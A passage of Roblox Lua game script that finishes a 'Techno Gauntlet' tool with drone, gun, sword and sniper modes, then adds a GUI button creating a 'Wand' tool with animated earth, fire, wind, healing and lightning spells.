		end
		CPlayer=Bin 
		h=hit.Parent:FindFirstChild("Humanoid")
		if h~=nil and hit.Parent.Name~=Character.Name and hit.Parent:FindFirstChild("Torso")~=nil then
			if attackdebounce == false then 
				attackdebounce = true 
				coroutine.resume(coroutine.create(function() 
					wait(0.2) 
					attackdebounce = false 
				end)) 
				Damage=Damage
--[[        if game.Players:GetPlayerFromCharacter(hit.Parent)~=nil then
            return
        end]]
				--            hs(hit,1.2) 
				c=Instance.new("ObjectValue")
				c.Name="creator"
				c.Value=game:service("Players").LocalPlayer
				c.Parent=h
				game:GetService("Debris"):AddItem(c,.5)
				Damage=Damage+math.random(0,10)
				--        h:TakeDamage(Damage)
				blocked=false
				block=hit.Parent:findFirstChild("Block")
				if block~=nil then
					print("herp")
					if block.Value>0 then
						blocked=true
						block.Value=block.Value-1
						print(block.Value)
					end
				end
				if blocked==false then
					--        h:TakeDamage(Damage)
					h.Health=h.Health-Damage
					showDamage(hit.Parent,Damage,.5)
				else
					h:TakeDamage(1)
					showDamage(hit.Parent,1,.5)
				end
				vp=Instance.new("BodyVelocity")
				vp.P=500
				vp.maxForce=Vector3.new(math.huge,0,math.huge)
				--        vp.velocity=Character.Torso.CFrame.lookVector*Knockback
				vp.velocity=Head.CFrame.lookVector*Knockback+Head.Velocity/1.05
				if Knockback>0 then
					vp.Parent=hit.Parent.Torso
				end
				game:GetService("Debris"):AddItem(vp,.25)
				c=Instance.new("ObjectValue")
				c.Name="creator"
				c.Value=Player
				c.Parent=h
				game:GetService("Debris"):AddItem(c,.5)
				CRIT=false
				hitDeb=true
				AttackPos=6
			end
		end 
	end

	showDamage=function(Char,Dealt,du)
		m=Instance.new("Model")
		m.Name=tostring(Dealt)
		h=Instance.new("Humanoid")
		h.Health=0
		h.MaxHealth=0
		h.Parent=m
		c=Instance.new("Part")
		c.Transparency=0
		c.BrickColor=BrickColor:Red()
		if CRIT==true then
			c.BrickColor=BrickColor.new("Really red")
		end
		c.Name="Head"
		c.TopSurface=0
		c.BottomSurface=0
		c.formFactor="Plate"
		c.Size=Vector3.new(1,.4,1)
		ms=Instance.new("CylinderMesh")
		ms.Scale=Vector3.new(.8,.8,.8)
		if CRIT==true then
			ms.Scale=Vector3.new(1,1.25,1)
		end
		ms.Parent=c
		c.Reflectance=0
		Instance.new("BodyGyro").Parent=c
		c.Parent=m
		c.CFrame=CFrame.new(Char["Head"].CFrame.p+Vector3.new(0,1.5,0))
		f=Instance.new("BodyPosition")
		f.P=2000
		f.D=100
		f.maxForce=Vector3.new(math.huge,math.huge,math.huge)
		f.position=c.Position+Vector3.new(0,3,0)
		f.Parent=c
		game:GetService("Debris"):AddItem(m,.5+du)
		c.CanCollide=false
		m.Parent=workspace
		c.CanCollide=false
	end

	function ob1d(mouse) 
		if attack == true then return end 
		hold=true
		if Mode=="Drones" and Aiming==true then
			print("Attack drones")
			for i=0,1,0.1 do
				wait()
				RW.C0=cf(1.5, 0.5, 0) * euler(0.5+1.07*i,0,0)
				RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
				LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2)
				LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			end
			Drone1debounce=false
			Drone2debounce=false
			Drone3debounce=false
			for _,v in pairs(modelzorz:children()) do
				if v.Name=="Drone" then
					coroutine.resume(coroutine.create(function(Drone) 
						while hold==true do
							so("http://roblox.com/asset/?id=10209257",Drone.DPart1,0.5,1.5) 
							shoottrail(MMouse.Hit.p,Drone.DPart1,5,0,1)
							wait(math.random(0,2)+math.random())
						end
					end),v)
				end
			end
			while hold==true do
				wait()
			end
			for i=0,1,0.1 do
				wait()
				RW.C0=cf(1.5, 0.5, 0) * euler(1.57-1.07*i,0,0)
				RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
				LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2)
				LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			end
		elseif Aiming==false then
			for _,v in pairs(modelzorz:children()) do
				if v.Name=="Drone" and v:findFirstChild("CanShoot")~=nil then
					coroutine.resume(coroutine.create(function(Drone) 
						while hold==true do
							if v.CanShoot.Value==true then
								print("Shoot")
								so("http://roblox.com/asset/?id=10209257",Drone.DPart1,0.5,1.5) 
								shoottrail(Drone.DPart6.Position,Drone.DPart1,5,0,1)
							elseif v.CanShoot.Value==false then
								print("NoShoot")
							end
							wait(math.random(0,2)+math.random())
						end
					end),v)
				end
			end
		end
		if Mode=="Gun" then
			print("Shoot")
			Shoot()
		end
		if Mode=="Sword" then
			slash1()
			if hold==true then
				slash2()
			end
			if hold==true then
				slash3()
			end
			wait(0.5)
			Bg.Parent=nil
			Neck.C0=necko*euler(0,0,0)
			swld1.C0=euler(0,-1.57,-1.57)*cf(0,1,0)
			swld1.C1=euler(0,1.57,0)
			RW.C0=cf(1.5, 0.5, 0) * euler(0,0,0.2)
			RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
			LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.4)
			LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
		end
		if Mode=="Sniper" and SnipAim==true then
			SniperShoot()
		end
	end 

	function ob1u(mouse) 
		hold = false 
	end 

	buttonhold = false 

	eul=0
	function key(key) 
		if attack == true then return end 
		if Mode=="Drones" then
			if key=="z" then
				RemoveDrones()
				Mode="Choose"
				equipanim() 
				return 
			end
			if key=="f" then
				if Aiming==false then
					attack=true
					for i=0,1,0.1 do
						wait()
						RW.C0=cf(1.5, 0.5, 0) * euler(0.5+2.64*i,0,0)
						RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
						LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2)
						LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
					end
					for i=0,1,0.1 do
						wait()
						RW.C0=cf(1.5, 0.5, 0) * euler(3.14-1.57*i,0,0)
						RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
						LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2)
						LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
					end
					Aiming=true
					coroutine.resume(coroutine.create(function() 
						while Aiming==true do
							wait()
							DroneTarget=MMouse.Hit.p
						end
					end))
					wait(0.5)
					for i=0,1,0.1 do
						wait()
						RW.C0=cf(1.5, 0.5, 0) * euler(1.57-1.07*i,0,0)
						RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
						LW.C0=cf(-1.5, 0.5, 0) * euler(0,0,-0.2)
						LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
					end
					attack=false
				elseif Aiming==true then
					attack=true
					for i=0,1,0.1 do
						wait()
						RW.C0=cf(1.5-0.5*i, 0.5, -0.5*i) * euler(.5+1.07*i,0,-1*i)
						RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
						LW.C0=cf(-1.5+0.5*i, 0.5, -0.5*i) * euler(1.57*i,0,-0.2+1.2*i)
						LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
					end
					Aiming=false
					for _,v in pairs(modelzorz:children()) do
						if v.Name=="Drone" then
							Valuee=Instance.new("BoolValue")
							Valuee.Parent=v
							Valuee.Name="CanShoot"
							print("Found Drone")
							coroutine.resume(coroutine.create(function(DDrone,Val,Gyro) 
								--coroutine.resume(coroutine.create(function() 
								while Aiming==false do
									wait()
									local target = findNearestTorso(DDrone.DPart1.Position)
									if target~=nil then
										Val.Value=true
										Gyro.cframe=cf(DDrone.DPart1.Position, target.Position)
									else
										Val.Value=false
										Gyro.cframe=cf(DDrone.DPart1.Position, Torso.Position)
									end
								end
								Val.Parent=nil
							end),v,Valuee,v.DPart1.DroneGyro)
						end
					end
					wait(0.5)
					for i=0,1,0.1 do
						wait()
						RW.C0=cf(1+.5*i, 0.5, -0.5+0.5*i) * euler(1.57-1.07*i,0,-1+1*i)
						RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
						LW.C0=cf(-1-.5*i, 0.5, -0.5+0.5*i) * euler(1.57-1.57*i,0,1-1.2*i)
						LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
					end
					attack=false
				end
			end
		end
		if Mode=="Gun" then
			if key=="x" then
				RemoveGun()
				Mode="Choose"
				equipanim() 
				return 
			end
		end
		if Mode=="Sword" then
			if key=="c" then
				RemoveSword()
				Mode="Choose"
				equipanim() 
				return 
			end
			if key=="f" then
				BowShoot()
			end
		end
		if Mode=="Sniper" then
			if key=="v" then
				if SnipAim==true then
					SnipAim=false
					UnAim()
				end
				RemoveSniper()
				Mode="Choose"
				equipanim()
				return
			end
			if key=="f" then
				if SnipAim==false then
					SnipAim=true
					Aim()
				else
					SnipAim=false
					UnAim()
				end
			end
		end
		if Mode=="Choose" then
			if key=="f" then
				RemoveDrones2()
			end
			if key=="z" then
				Drone1,Drone2,Drone3=Drones()
			end
			if key=="x" then
				Gun()
			end
			if key=="c" then
				Sword()
			end
			if key=="v" then
				Sniper()
			end
		end
	end 

	function key2(key) 
		if key=="f" then
			BowAim=false
		end
	end 

	function s(mouse) 
		mouse.Button1Down:connect(function() ob1d(mouse) end) 
		mouse.Button1Up:connect(function() ob1u(mouse) end) 
		mouse.KeyDown:connect(key) 
		mouse.KeyUp:connect(key2) 
		unsheathed = true 
		player = Player 
		ch = Character 
		MMouse = mouse 
		RSH = ch.Torso["Right Shoulder"] 
		LSH = ch.Torso["Left Shoulder"] 
		-- 
		RSH.Parent = nil 
		LSH.Parent = nil 
		-- 
		RW.Part0 = ch.Torso 
		RW.C0 = CFrame.new(1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.3, 0, -0.5) 
		RW.C1 = CFrame.new(0, 0.5, 0) 
		RW.Part1 = ch["Right Arm"] 
		RW.Parent = ch.Torso 
		--_G.R = RW 
		-- 
		LW.Part0 = ch.Torso 
		LW.C0 = CFrame.new(-1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.7, 0, 0.8) 
		LW.C1 = CFrame.new(0, 0.5, 0) 
		LW.Part1 = ch["Left Arm"] 
		LW.Parent = ch.Torso 
		--_G.L = LW 
		--
		equipanim() 
	end 

	function ds(mouse) 
		hideanim() 
		wait(0) 
		RW.Parent = nil 
		LW.Parent = nil 
		RSH.Parent = player.Character.Torso 
		LSH.Parent = player.Character.Torso 
	end 

	Bin.Selected:connect(s) 
	Bin.Deselected:connect(ds) 
	print("Fenrier's Techno Gauntlet loaded.")

	-- mediafire lego 
--[[ 
Copyrighted (C) Fenrier 2013
]]

end)
--
local button = Instance.new("TextButton")
button.Parent = ws
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Wand"
button.Position = UDim2.new(0,0,0,231)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Wand"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	tool = Instance.new("HopperBin") 

	player = game.Players.LocalPlayer
	char = player.Character 
	tool = Instance.new("HopperBin") 
	tool.Parent = player.Backpack 
	script.Parent = tool
	tool.Name = "Wand" 

	spin = false

	landc = "Earth green"
	firec = "Bright red"
	icec = "Light blue"
	windc = "Institutional white"
	helthc = "Lime green"
	elec = "New Yeller"

	norm = 18

	handle = Instance.new("Part") 
	handle.Parent = game.Lighting 
	handle.Name = "Handle" 
	handle.FormFactor = "Symmetric" 
	handle.Size = Vector3.new(1,4,1) 
	handle.TopSurface = 0 
	handle.BottomSurface = 0 
	handle.BrickColor = BrickColor.new("Black") 
	handle.Anchored = false 
	handle.Position = char["Right Arm"].Position 
	handle.CanCollide = false
	handle.Locked = true
	handle2 = Instance.new("Part") 
	handle2.Parent = game.Lighting 
	handle2.Name = "Handle2" 
	handle2.Shape = "Ball"
	handle2.Size = Vector3.new(1,1,1) 
	handle2.TopSurface = 0 
	handle2.BottomSurface = 0 
	handle2.BrickColor = BrickColor.new("Bright red") 
	handle2.Anchored = false 
	handle2.Position = char["Right Arm"].Position 
	handle2.Transparency = 0.1
	handle2.CanCollide = false
	handle2.Locked = true

	handle3 = Instance.new("Part") 
	handle3.Parent = game.Lighting 
	handle3.Name = "Handle2" 
	handle3.Shape = "Ball"
	handle3.Size = Vector3.new(1,1,1) 
	handle3.TopSurface = 0 
	handle3.BottomSurface = 0 
	handle3.BrickColor = BrickColor.new("Black") 
	handle3.Anchored = false 
	handle3.Position = char["Right Arm"].Position 
	handle3.CanCollide = false
	handle3.Locked = true
	local m = Instance.new("CylinderMesh") 
	m.Parent = handle 
	m.Scale = Vector3.new(0.42,1,0.42) 
	local m2 = Instance.new("SpecialMesh") 
	m2.Parent = handle2 
	m2.MeshType = "Sphere"
	m2.Scale = Vector3.new(0.8,0.8,0.8) 
	local m3 = Instance.new("SpecialMesh") 
	m3.Parent = handle3 
	m3.MeshType = "FileMesh"
	m3.MeshId = "http://www.roblox.com/asset/?id=1033714"
	m3.Scale = Vector3.new(0.4,0.85,0.4) 
	brick1 = Instance.new("Part")
	brick1.Parent = char
	brick1.formFactor = "Symmetric"
	brick1.Size = Vector3.new(1,1,1)
	brick1.CFrame = player.Character.Torso.CFrame * CFrame.new(-1.5,0.5,0)
	brick1.Shape = "Ball"
	brick1.CanCollide = false
	brick1.Transparency = 1
	brick1.Locked = true
	mesh1 = Instance.new("SpecialMesh")
	mesh1.Parent = brick1
	mesh1.MeshType = "Sphere"
	mesh1.Scale = Vector3.new(1.4,1.4,1.4)
	brick2 = Instance.new("Part")
	brick2.Parent = game.Lighting
	brick2.formFactor = "Symmetric"
	brick2.Size = Vector3.new(1,1,1)
	brick2.CFrame = player.Character.Torso.CFrame * CFrame.new(-1.5,0.5,0)
	brick2.Shape = "Ball"
	brick2.CanCollide = false
	brick2.Transparency = 1
	brick2.BrickColor = handle2.BrickColor
	brick2.Locked = true
	mesh2 = Instance.new("SpecialMesh")
	mesh2.Parent = brick2
	mesh2.MeshType = "Sphere"
	mesh2.Scale = Vector3.new(0.5,0.5,0.5)
	brick3 = Instance.new("Part")
	brick3.Parent = game.Lighting
	brick3.formFactor = "Symmetric"
	brick3.Size = Vector3.new(1,1,1)
	brick3.CFrame = player.Character.Torso.CFrame * CFrame.new(-1.5,0.5,0)
	brick3.Shape = "Ball"
	brick3.CanCollide = false
	brick3.Transparency = 1
	brick3.BrickColor = handle2.BrickColor
	brick3.Locked = true
	mesh3 = Instance.new("SpecialMesh")
	mesh3.Parent = brick3
	mesh3.MeshType = "Sphere"
	mesh3.Scale = Vector3.new(0.5,0.5,0.5)
	wads = Instance.new("Weld")
	wads.Parent = char.Torso
	wads.Part0 = wads.Parent
	wads.Part1 = brick1
	wads.C1 = CFrame.new(-1.5,-0.5,0)
	wads2 = Instance.new("Weld")
	wads2.Parent = handle2
	wads2.Part0 = wads2.Parent
	wads2.Part1 = brick2
	wads2.C1 = CFrame.new(1,0,0)
	wads3 = Instance.new("Weld")
	wads3.Parent = handle2
	wads3.Part0 = wads2.Parent
	wads3.Part1 = brick2
	wads3.C1 = CFrame.new(-1,0,0)

	wa = Instance.new("Weld")
	wa.Parent = brick1
	wa.Part0 = nil
	wa.Part1 = nil

	weld = Instance.new("Weld")

	toha = Instance.new("Weld")
	toha.Parent = char.Torso
	toha.Part0 = nil
	toha.Part1 = nil
	toha.C1 = CFrame.fromEulerAnglesXYZ(0,0,-2.5) * CFrame.new(0,0,-0.7)

	original = CFrame.fromEulerAnglesXYZ(-1.55,0,0) * CFrame.new(0,0,0.6)
	weporigin = CFrame.fromEulerAnglesXYZ(1.55,0,0) * CFrame.new(0, 1.1, 0.5)

	myhum = char.Humanoid
	myhum.WalkSpeed = norm

	enabled = false
	hol = false

	function select(mouse, key)
		wa.Part0 = wa.Parent
		wa.Part1 = char["Right Arm"]
		wa.C1 = original
		weld.Parent = char["Right Arm"] 
		weld.Part0 = nil
		weld.Part1 = nil
		weld.C1 = weporigin 
		handle.Parent = char 
		handle2.Parent = char
		handle3.Parent = char
		for i = 1, 8 do
			wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(-0.35,0,0)
			wait()
		end
		for i = 1, 4 do
			wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(0,0.2,0)
			wait()
		end
		toha.Part0 = nil
		toha.Part1 = nil
		weld.Part0 = weld.Parent 
		weld.Part1 = handle 
		for i = 1, 4 do
			wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(0,-0.2,0)
			wait()
		end
		for i = 1, 8 do
			wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(0.35,0,0)
			wait()
		end
		wa.C1 = original
		spin = true
		brick2.Transparency = 0.3
		brick2.Parent = char
		brick3.Transparency = 0.3
		brick3.Parent = char
		weld2 = Instance.new("Weld") 
		weld2.Parent = handle 
		weld2.Part0 = weld2.Parent 
		weld2.Part1 = handle2 
		weld2.C1 = CFrame.new(0, 0, 2.1) 
		weld3 = Instance.new("Weld") 
		weld3.Parent = handle 
		weld3.Part0 = weld3.Parent 
		weld3.Part1 = handle3 
		weld3.C1 = CFrame.new(0, 0, 1.4) 
		weld.C1 = CFrame.fromEulerAnglesXYZ(1.55,0,0) * CFrame.new(0, 1.1, 0.5) 
		weld2.C1 = CFrame.fromEulerAnglesXYZ(0,0,0) * CFrame.new(0, -2.1, 0) 
		weld3.C1 = CFrame.fromEulerAnglesXYZ(3.2,0,0) * CFrame.new(0, -1.5, 0) 
		coroutine.resume(coroutine.create(function()
			while spin == true do
				for i=1, 20 do
					wait()
					handle2.Transparency = handle2.Transparency + 0.025
				end
				for i=1, 20 do
					wait()
					handle2.Transparency = handle2.Transparency - 0.025
				end
			end
		end))
		coroutine.resume(coroutine.create(function()
			while spin == true do
				wait()
				wads2.C1 = wads2.C1 * CFrame.fromEulerAnglesXYZ(0,0.15,0)
				wads3.C1 = wads3.C1 * CFrame.fromEulerAnglesXYZ(0,0.15,0)
				local fade = brick2:clone()
				fade.Parent = char
				fade.CFrame = brick2.CFrame
				local weld = wads2:clone()
				weld.Parent = handle2
				weld.Part0 = weld.Parent
				weld.Part1 = fade
				local fade2 = brick3:clone()
				fade2.Parent = char
				fade2.CFrame = brick3.CFrame
				local weld2 = wads3:clone()
				weld2.Parent = handle2
				weld2.Part0 = weld2.Parent
				weld2.Part1 = fade2
				coroutine.resume(coroutine.create(function()
					for i=1, 8 do
						wait()
						fade.Transparency = fade.Transparency + 0.12
						fade2.Transparency = fade2.Transparency + 0.12
					end
					fade:remove()
					fade2:remove()
				end))
			end
		end))
		enabled = false
		mouse.KeyDown:connect(function(key) 
			key = key:lower() 
			if (key == "k") then 
				if enabled == true then return end
				enabled = true
				hol = true
				for i=1, 6 do
					wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(0.1,0.1,0)
					wait()
				end
				handle2.BrickColor = BrickColor.new(landc)
				brick2.BrickColor = handle2.BrickColor
				brick3.BrickColor = handle2.BrickColor
				while hol == true do
					wait(0.05)
					local ki = Instance.new("Part")
					ki.Parent = workspace
					ki.Name = "Landmon"
					ki.Size = Vector3.new(1,1,1)
					ki.BrickColor = handle2.BrickColor
					ki.TopSurface = 0
					ki.BottomSurface = 0
					ki.CanCollide = false
					ki.Anchored = true
					ki.CFrame = CFrame.new(mouse.Hit.p)
					ki.CFrame = ki.CFrame * CFrame.new(0, -4, 0)
					local mef = Instance.new("SpecialMesh")
					mef.Parent = ki
					mef.MeshType = "Sphere"
					mef.Scale = Vector3.new(9,16,9)
					coroutine.resume(coroutine.create(function()
						for i=1, 5 do
							wait()
							wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(0,0.12,0)
						end
						for i=1, 5 do
							wait()
							wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(0,-0.12,0)
						end
					end))
					coroutine.resume(coroutine.create(function()
						for i=1, 25 do
							wait()
							ki.CFrame = ki.CFrame * CFrame.new(0, 0.3, 0)
						end
						loo = ki.CFrame
						ki.CanCollide = true
						mef.Scale = Vector3.new(1,1,1)
						ki.Size = Vector3.new(9,16,9)
						ki.CFrame = loo
						wait(7)
						for i=1, 20 do
							wait()
							ki.Transparency = ki.Transparency + 0.05
						end
						ki:remove()
					end))
				end
			elseif (key == "f") then
				if enabled == true then return end
				enabled = true
				pof = mouse.Hit.p
				local part = Instance.new("Part")
				local fire = Instance.new("Fire")
				fire.Parent = part
				fire.Heat = 30
				fire.Size = 40
				local smoke = Instance.new("Smoke")
				smoke.Parent = part
				smoke.RiseVelocity = 2
				smoke.Size = 20
				smoke.Color = Color3.new(0,0,0)
				smoke.Opacity = 1
				local par = Instance.new("Part")
				par.Parent = workspace
				par.Size = Vector3.new(9,1,1)
				par.Transparency = 0
				par.Anchored = true
				par.TopSurface = 0
				par.BottomSurface = 0
				par.BrickColor = BrickColor.new(firec)
				par.CFrame = CFrame.new(pof) * CFrame.new(0,-0.498,0)
				par.CFrame = par.CFrame * CFrame.Angles(0,0.8,0)
				par.CanCollide = false
				local mes = Instance.new("SpecialMesh")
				mes.Parent = par
				mes.MeshType = "Brick"
				mes.Scale = Vector3.new(1,1,1)
				local pa = par:clone()
				pa.Parent = workspace
				pa.CFrame = CFrame.new(pof) * CFrame.new(0,-0.498,0)
				pa.CFrame = pa.CFrame * CFrame.Angles(0,-0.8,0)
				handle2.BrickColor = BrickColor.new(firec)
				brick2.BrickColor = handle2.BrickColor
				brick3.BrickColor = handle2.BrickColor
				for i=1, 10 do
					wait(0.03)
					wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(-0.1,0.05,0)
				end
				for i=1, 4 do
					for i=1, 3 do
						wait(0.01)
						wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(0,-0.05,0.1)
					end
					for i=1, 3 do
						wait(0.01)
						wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(0.03,0.05,-0.1)
					end
				end
				for i=1, 7 do
					wait(0.01)
					wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(0,0.1,-0.1)
				end
				wait(0.6)
				for i=1, 10 do
					wait(0.02)
					wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(0.1,-0.05,0.3)
					par.Transparency = par.Transparency + 0.1
					pa.Transparency = pa.Transparency + 0.1
					mes.Scale = mes.Scale + Vector3.new(0.1,0,0.05)
					pa.Mesh.Scale = pa.Mesh.Scale + Vector3.new(0.1,0,0.05)
				end
				wait(0.1)
				pa:remove()
				par:remove()
				part.Parent = workspace
				part.Size = Vector3.new(3,3,3)
				part.Anchored = true
				part.CFrame = CFrame.new(pof) 
				part.CFrame = part.CFrame * CFrame.Angles(1.2,0,0)
				part.Transparency = 1
				coroutine.resume(coroutine.create(function()
					for i=1, 100 do
						wait()
						part.CFrame = part.CFrame * CFrame.Angles(0,0,0.4)
					end
				end))
				local explode = Instance.new("Explosion")
				explode.Parent = char
				explode.BlastRadius = 11
				explode.BlastPressure = 400000
				explode.Position = part.Position
				explode.archivable = false
				wait(0.3)
				wa.C1 = original
				wait(0.7)
				fire.Enabled = false
				smoke.Enabled = false
				wait(0.2)
				part:remove()
				wait(1)
				enabled = false
			elseif (key == "q") then
				if enabled == true then return end
				enabled = true
				handle2.BrickColor = BrickColor.new(windc)
				brick2.BrickColor = handle2.BrickColor
				brick3.BrickColor = handle2.BrickColor
				for i=1, 8 do
					wait(0.01)
					wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(0,0,-0.18)
				end
				for i=1, 2 do
					wait(0.01)
					wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(0,-0.15,0)
				end
				wait(0.3)
				for i=1, 2 do
					wait(0.01)
					wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(0,0.3,0)
				end
				local p = Instance.new("Part")
				p.Parent = workspace
				p.Name = "Sword"
				p.Size = Vector3.new(1,4,1)
				p.BottomSurface = 0
				p.TopSurface = 0
				p.Anchored = false
				p.CanCollide = false
				p.CFrame = handle.CFrame
				p.CFrame = p.CFrame * CFrame.Angles(0,0,1.55)
				p:BreakJoints()
				local mt = Instance.new("SpecialMesh")
				mt.Parent = p
				mt.MeshType = "FileMesh"
				mt.MeshId = "http://www.roblox.com/asset/?id=12768042"
				mt.TextureId = "http://www.roblox.com/asset/?id=21262906"
				local bv = Instance.new("BodyVelocity")
				bv.Parent = p
				bv.velocity = char.Torso.CFrame.lookVector * 45
				local bva = Instance.new("BodyAngularVelocity")
				bva.Parent = p
				bva.angularvelocity = Vector3.new(0,14,0)
				p.Touched:connect(function(hit)
					if hit.Parent.Name == player.Name then return end
					local hum = hit.Parent:findFirstChild("Humanoid")
					if hum ~= nil then
						local hed = hit.Parent:findFirstChild("Head")
						if hed ~= nil then
							for i=1, 5 do
								wait()
								hed.Parent.Torso.Neck.C1 = hed.Parent.Torso.Neck.C1 * CFrame.new(0, 0, -0.9)
							end
							hum.Health = 0
							wait(0.05)
							hed.Velocity = Vector3.new(math.random(-30,30),40,math.random(-30,30))
							hed.RotVelocity = Vector3.new(math.random(-25,25),math.random(-25,25),math.random(-25,25))
						end
						hum.Health = 0
					end
				end)
				local spi = true
				coroutine.resume(coroutine.create(function()
					while spi == true do
						local fad = p:clone()
						fad.Parent = workspace
						fad.BrickColor = BrickColor.new(windc)
						fad.Transparency = 0.2
						fad.Mesh.TextureId = "Clear"
						fad.Anchored = true
						coroutine.resume(coroutine.create(function()
							for i=1, 8 do
								wait()
								fad.Transparency = fad.Transparency + 0.1
							end
							fad:remove()
						end))
						wait()
					end
				end))
				for i=1, 4 do
					wait(0.01)
					wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(0,0.3,0)
				end
				wait(0.3)
				for i=1, 7 do
					wait(0.01)
					wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(0,-0.2,0.3)
				end
				wa.C1 = original
				wait(0.3)
				enabled = false
				wait(1.2)
				spi = false
				wait()
				p:remove()
			elseif (key == "e") then
				if enabled == true then return end
				enabled = true
				myhum.WalkSpeed = 0
				handle2.BrickColor = BrickColor.new(helthc)
				brick2.BrickColor = handle2.BrickColor
				brick3.BrickColor = handle2.BrickColor
				hol = true
				for i=1, 6 do
					wait(0.01)
					wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(-0.13,0,0)
					weld.C1 = weld.C1 * CFrame.fromEulerAnglesXYZ(0,0,0) * CFrame.new(0,0,-0.1)
				end
				wait(0.5)
				for i=1, 3 do
					wait(0.01)
					wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(0.4,0,0)
					weld.C1 = weld.C1 * CFrame.fromEulerAnglesXYZ(0,0,0) * CFrame.new(0,0,-0.23)
				end
				local pf = Instance.new("Part")
				pf.Parent = workspace
				pf.Name = "Healthbump"
				pf.Size = Vector3.new(7,1,7)
				pf.BottomSurface = 0
				pf.TopSurface = 0
				pf.Anchored = true
				pf.CanCollide = false
				pf.CFrame = char.Torso.CFrame * CFrame.new(0,-2.8, 0)
				pf.Transparency = 0.3
				pf.BrickColor = handle2.BrickColor
				local meg = Instance.new("CylinderMesh")
				meg.Parent = pf
				meg.Scale = Vector3.new(0.6,0.8,0.6)
				hecols = {"Bright green", "Lime green", "Dark green", "Camo"}
				coroutine.resume(coroutine.create(function()
					for i=1, 50 do
						wait()
						pf.Transparency = pf.Transparency + 0.02
						meg.Scale = meg.Scale + Vector3.new(0.045,0,0.045)
					end
				end))
				while hol == true do
					wait(0)
					myhum.Health = myhum.Health + 0.5
					local chanc = math.random(1,20)
					if chanc == 8 then
						coroutine.resume(coroutine.create(function()
							pf.Transparency = 0.3
							meg.Scale = Vector3.new(0.6,0.8,0.6)
							for i=1, 50 do
								wait()
								pf.Transparency = pf.Transparency + 0.02
								meg.Scale = meg.Scale + Vector3.new(0.045,0,0.045)
							end
						end))
					end
					local hp = Instance.new("Part")
					hp.Parent = workspace
					hp.formFactor = "Symmetric"
					local randsiz = math.random(1,2)
					local col = math.random(1,4)
					hp.Size = Vector3.new(randsiz,randsiz,randsiz)
					hp.BrickColor = BrickColor.new(hecols[col])
					hp.TopSurface = 0
					hp.BottomSurface = 0
					hp.Transparency = 0.1
					hp.CFrame = char.Torso.CFrame * CFrame.new(math.random(-5,5),-3,math.random(-5,5))
					hp.CFrame = hp.CFrame * CFrame.Angles(math.random(),math.random(),math.random())
					hp.CanCollide = false
					hp.Anchored = false
					hp:BreakJoints()
					local mf = Instance.new("SpecialMesh")
					mf.MeshType = "Brick"
					mf.Parent = hp
					mf.Scale = Vector3.new(0.65,0.65,0.65)
					local bv = Instance.new("BodyVelocity")
					bv.Parent = hp
					bv.velocity = Vector3.new(0,10,0)
					coroutine.resume(coroutine.create(function()
						wait(0.9)
						for i=1, 9 do
							hp.Transparency = hp.Transparency + 0.1
							wait()
						end
						hp:remove()
					end))
				end
			elseif (key == "r") then
				if enabled == true then return end
				enabled = true
				myhum.WalkSpeed = 0
				handle2.BrickColor = BrickColor.new(elec)
				brick2.BrickColor = handle2.BrickColor
				brick3.BrickColor = handle2.BrickColor
				cols = {"Neon orange", "New Yeller", "Bright yellow", "Bright orange"}
				for i=1, 6 do
					wait(0.01)
					wa.C1 = wa.C1 * CFrame.fromEulerAnglesXYZ(-0.11,0,0)
				end
				wait(0.35)
				tab = {}
				for i=1, 50 do
					for i=1, 20 do
						local a = Instance.new("Part")
						a.Parent = workspace
						a.formFactor = "Symmetric"
						a.Size = Vector3.new(4,1,1)
						a.TopSurface = 0
						a.BottomSurface = 0
						local numb = math.random(1,4)
						a.BrickColor = BrickColor.new(cols[numb])
						a.Anchored = true
						a.CanCollide = false
						a.Transparency = 0.3
						local mo = Instance.new("SpecialMesh")
						mo.Parent = a
						mo.MeshType = "Brick"
						mo.Scale = Vector3.new(1,0.2,0.2)
